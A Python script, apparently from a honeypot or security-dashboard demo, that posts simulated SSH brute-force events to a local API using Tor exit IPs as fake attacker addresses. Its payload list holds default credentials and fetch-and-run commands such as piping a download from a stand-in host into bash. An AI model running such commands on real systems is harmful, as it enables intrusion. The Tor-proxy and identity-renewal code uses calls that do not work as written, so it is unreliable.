#!/usr/bin/env python3
"""Realistic attack seeding via Tor - generates authentic attacker IPs"""
import os
import asyncio
import aiohttp
import socket
from datetime import datetime, timezone

# Configuration from environment
TOR_PROXY = os.getenv("TOR_PROXY", "tor:9050")
SSH_HOST = os.getenv("SSH_HOST", "host.docker.internal")
SSH_PORT = int(os.getenv("SSH_PORT", 22))
PUBLIC_IP = os.getenv("PUBLIC_IP")  # Your public IP to skip
SEED_INTERVAL = int(os.getenv("SEED_INTERVAL", 300))

# Realistic attack payloads
PAYLOADS = [
    {"username": "root", "password": "root", "command": None},
    {"username": "admin", "password": "admin123", "command": "id"},
    {"username": "test", "password": "test", "command": "uname -a"},
    {"username": "ubuntu", "password": "ubuntu", "command": "wget http://malware.com/shell.sh"},
    {"username": "deploy", "password": "deploy", "command": "curl malicious.payload.sh | bash"},
]

async def get_tor_ip(proxy_url: str) -> str:
    """Get current public IP through Tor proxy"""
    try:
        connector = aiohttp.SOCKSConnector.from_url(f"socks5://{proxy_url}")
        async with aiohttp.ClientSession(connector=connector) as session:
            async with session.get("https://api.ipify.org?format=json", timeout=10) as resp:
                data = await resp.json()
                return data["ip"]
    except Exception as e:
        print(f"Tor IP lookup failed: {e}")
        return "127.0.0.1"

async def send_attack(proxy_url: str, payload: dict):
    """Send SSH attack through Tor proxy"""
    # For now, simulate by hitting the API directly
    # Real implementation would use asyncssh with SOCKS proxy
    import urllib.request
    try:
        # Report fake attack to API (for demo)
        base_url = f"http://{os.getenv('API_HOST', 'api')}:{os.getenv('API_PORT', '8000')}"
        async with aiohttp.ClientSession() as session:
            # Simulate attack event
            ip = await get_tor_ip(proxy_url)
            if PUBLIC_IP and ip == PUBLIC_IP:
                return  # Skip self
            
            await session.post(f"{base_url}/events", json={
                "session_id": f"tor-{int(datetime.now().timestamp())}",
                "attacker_ip": ip,
                "protocol": "SSH",
                "attack_type": "BRUTE_FORCE",
                "payload": f"{payload['username']}:{payload['password']}",
                "severity": 70
            })
            print(f"[+] Reported attack from Tor IP: {ip}")
    except Exception as e:
        print(f"[-] Attack failed: {e}")

async def main():
    """Main seeding loop with Tor identity renewal"""
    print(f"Starting Tor seed worker - interval: {SEED_INTERVAL}s")
    
    while True:
        payload = PAYLOADS[int(datetime.now().timestamp()) % len(PAYLOADS)]
        await send_attack(TOR_PROXY, payload)
        
        # Ask Tor for new identity
        try:
            async with aiohttp.ClientSession() as session:
                await session.get(f"socks5://{TOR_PROXY}/signal/newnym")
        except:
            pass
        
        await asyncio.sleep(SEED_INTERVAL)

if __name__ == "__main__":
    asyncio.run(main())